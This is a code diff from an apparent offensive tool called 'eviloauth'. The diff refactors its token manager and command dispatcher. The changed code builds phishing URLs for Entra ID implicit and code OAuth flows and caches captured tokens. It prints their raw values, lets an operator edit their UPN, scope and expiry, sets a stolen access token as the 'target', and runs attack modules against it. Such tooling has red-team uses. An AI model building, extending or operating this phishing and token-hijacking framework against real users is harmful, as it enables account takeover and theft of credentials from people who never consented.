@@ -35,19 +35,24 @@ class TokenManager:
             new_token_key = f'OAT-{new_upn}'
             token.set_upn(new_upn)
             self.cache.set(new_token_key, token)
-            self.cache.delete(token_key)
-            print(f"UPN and key updated for OAT token. New key: {new_token_key}")
+            if new_token_key != token_key:
+                self.cache.delete(token_key)
+            logging.info(f"UPN updated for token {token_key}. New key: {new_token_key}")
+            return True
         else:
-            print("UPN update is not applicable for JWT tokens.")
-    
+            logging.error("UPN update is not applicable for JWT tokens or token not found.")
+            return False
+
     def update_scope(self, token_key, new_scope):
         token = self.cache.get(token_key)
         if token and not token.is_jwt:
             token.set_scope(new_scope)
             self.cache.set(token_key, token)
-            print(f"Scope updated for OAT token: {token_key}")
+            logging.info(f"Scope updated for token {token_key}")
+            return True
         else:
-            print("Scope update is not applicable for JWT tokens.")
+            logging.error("Scope update is not applicable for JWT tokens or token not found.")
+            return False
 
     def update_expiry(self, token_key, time_str):
         token = self.cache.get(token_key)
@@ -58,16 +63,14 @@ class TokenManager:
                 new_expiry = datetime.utcnow() + timedelta(hours=hours, minutes=minutes)
                 token.set_expiry(new_expiry)
                 self.cache.set(token_key, token)
-                print(f"Expiry updated to {new_expiry} for OAT token: {token_key}")
+                logging.info(f"Expiry updated to {new_expiry} for OAT token: {token_key}")
+                return True
             except (ValueError, IndexError):
-                print("Invalid time format. Please enter time as HHMM.")
+                logging.error("Invalid time format. Please enter time as HHMM.")
+                return False
         else:
-            print("Expiry update is not applicable for JWT tokens.")  
-    
-    def handle_callback(token):
-        token_key = token_manager.add(token)  # Adds token to cache and returns a key
-        logging.info(f"Token added with key: {token_key}")
-
+            logging.error("Expiry update is not applicable for JWT tokens or token not found.")
+            return False
 class Dispatcher:
     instance = None
     
@@ -95,9 +98,8 @@ class Dispatcher:
         if cmd == 'exit':
             self.dispatch_exit()
 
-        elif cmd == 'module':
-            self.dispatch_module(cmd_args)  # Assuming dispatch_module accepts a list of args
-
+        elif cmd == 'module' and len(cmd_args) >= 2:
+            self.dispatch_module(cmd_args[0], cmd_args[1], cmd_args[2:])
         elif cmd == 'tokens':
             self.dispatch_tokens(cmd_args)  # Handles all token-related commands
 
@@ -121,20 +123,39 @@ class Dispatcher:
         self.flask_server.shutdown()
         sys.exit()
 
-    def dispatch_module(self, cmd, sub, arg):
-        mod = self.module_dict[f'eviloauth.{cmd}.{sub}.{arg}']
-        mod.__run__(self.cache.get('target'), 0)
+    def dispatch_module(self, module_name, sub_module_name, module_args):
+        full_module_name = f'eviloauth.module.{module_name}.{sub_module_name}'
+
+        if full_module_name in self.module_dict:
+            mod = self.module_dict[full_module_name]
+
+            # Retrieve the target access token from the cache
+            target_access_token = cache.get('target')
+
+            # Ensure module_args contains the necessary information
+            if not module_args:
+                module_args = [target_access_token, 0]  # Default values for 'i' and 'target_access_token'
+            elif len(module_args) == 1:
+                module_args.append(0)  # Default value for 'i' if not provided
+
+            mod.__run__(*module_args)  # Pass the target_access_token and 'i' to the module
+        else:
+            logging.error(f'Module {full_module_name} not found')
 
     def dispatch_tokens(self, cmd_args):
+        logging.info(f"cmd_args: {cmd_args}")  # This helps to see what cmd_args contains
+
         if len(cmd_args) >= 1:
-            if cmd_args[0] == 'list':
+            subcmd = cmd_args[0]
+
+            if subcmd == 'list':
                 self.handle_tokens_list(cmd_args)
-            elif len(cmd_args) >= 4 and cmd_args[1] == 'set':
+            elif subcmd == 'set' and len(cmd_args) >= 4:
                 self.handle_tokens_set(cmd_args)
-            elif len(cmd_args) == 2 and cmd_args[0] == 'delete':
+            elif subcmd == 'delete' and len(cmd_args) == 2:
                 self.handle_tokens_delete(cmd_args)
             else:
-                print(f"Invalid or unrecognised subcommand: {cmd_args[0]}")
+                print(f"Invalid or unrecognised subcommand: {subcmd}")
 
     def handle_tokens_list(self, cmd_args):
         if len(cmd_args) > 1:
@@ -152,6 +173,9 @@ class Dispatcher:
                 # Issued at information
                 issued_at = f"{getattr(token_obj, 'today', 'N/A')} at {getattr(token_obj, 'time', 'N/A')}"
                 print(f"  Issued at: {issued_at}")
+                
+                # Print the raw token
+                print(f"  Raw Token: {token_obj.raw_token}")
             else:
                 print(f"No token found for key: {token_key}")
         else:
@@ -163,23 +187,31 @@ class Dispatcher:
                 print(key)
 
     def handle_tokens_set(self, cmd_args):
-        if len(cmd_args) >= 4 and cmd_args[1] == 'set':
-            token_key = cmd_args[0]
+        if len(cmd_args) >= 4 and cmd_args[0] == 'set':
+            token_key = cmd_args[1]
             action = cmd_args[2]
+            value = ' '.join(cmd_args[3:])
+
             if action == 'upn':
-                new_upn = cmd_args[3]
-                self.token_manager.update_upn(token_key, new_upn)
-            elif action == 'scope':
-                new_scope = cmd_args[3]
-                self.token_manager.update_scope(token_key, new_scope)
-            elif action == 'expiry':
-                if len(cmd_args[3]) == 4 and cmd_args[3].isdigit():
-                    new_expiry = cmd_args[3]
-                    self.token_manager.update_expiry(token_key, new_expiry)
+                if self.token_manager.update_upn(token_key, value):
+                    print(f"UPN updated successfully for {token_key}")
                 else:
-                    print("Invalid time format. Please enter time as HHMM.")
+                    logging.error(f"Failed to update UPN for {token_key}")
+            elif action == 'expiry':
+                value_str = str(value)  # Convert to string to ensure it's in the correct format
+                if self.token_manager.update_expiry(token_key, value_str):
+                    logging.info(f"Expiry updated successfully for {token_key}")
+                else:
+                    logging.error(f"Failed to update expiry for {token_key}")
+            elif action == 'scope':
+                if self.token_manager.update_scope(token_key, value):
+                    logging.info(f"Scope updated successfully for {token_key}")
+                else:
+                    logging.error(f"Failed to update scope for {token_key}")
             else:
-                print(f"Invalid format for 'add {action}' subcommand.")
+                logging.error("Invalid format for 'set' subcommand.")
+        else:
+            logging.error("Invalid format for 'set' subcommand.")
 
     def handle_tokens_delete(self, cmd_args):
         if len(cmd_args) == 2 and cmd_args[0] == 'delete':
@@ -200,27 +232,46 @@ class Dispatcher:
                 if arg in ['entra_implicit_flow', 'entra_code_flow']:
                     self.idp_instance = IDP(arg, self.redirect_server)
                     self.phishing_url = self.idp_instance.get_phishing_url()
-                    logging.info(f"Phishing URL set: {self.phishing_url}")
+                    print(f"Phishing URL set: {self.phishing_url}")
                 else:
                     logging.error(f"IDP {arg} is not supported. Supported IDPs: ['entra_implicit_flow', 'entra_code_flow']")
             # Add other subcommands if necessary
         else:
             logging.error("Invalid arguments for configure command")
 
-    def dispatch_target(self, cmd, sub, arg):
-        target = self.cache.get('target')
-        tokens = self.cache.get('tokens')
+    def handle_target_set(self, token_key):
+        # Logic to set the target
+        if token_key in self.token_manager.cache:
+            cache.set('target', self.token_manager.cache.get(token_key))
+            logging.info(f"Target set to {token_key}")
+        else:
+            logging.error(f"Token {token_key} not found")
 
-        if sub == 'list':
-            print(f'Current Target: {target}')
+    def handle_target_list(self):
+        # Logic to list the current target
+        current_target = cache.get('target')
+        if current_target:
+            print(f"Current Target:\n{current_target}")
+        else:
+            print(f"No targets set.\nTo set a target use the following command: target set <token name>")
 
-        elif sub == 'set':
-            if arg in tokens.keys():
-                access_token = tokens[arg]
-                self.cache.set('target', access_token)
+    def dispatch_target(self, cmd_args):
+        # Check if cmd_args has at least 1 element: subcommand
+        if len(cmd_args) >= 1:
+            sub = cmd_args[0]
 
-            elif arg not in tokens.keys():
-                raise EviloauthCommandException(f'Unknown token {arg}')
+            # Implement the logic for different subcommands
+            if sub == 'set':
+                if len(cmd_args) >= 2:
+                    token_key = cmd_args[1]
+                    self.handle_target_set(token_key)
+                else:
+                    logging.error("No token key provided for target set")
+            elif sub == 'list':
+                self.handle_target_list()
+            # Add other subcommands if necessary
+        else:
+            logging.error("Invalid arguments for target command")
 
     def dispatch_url(self):
         if self.phishing_url:
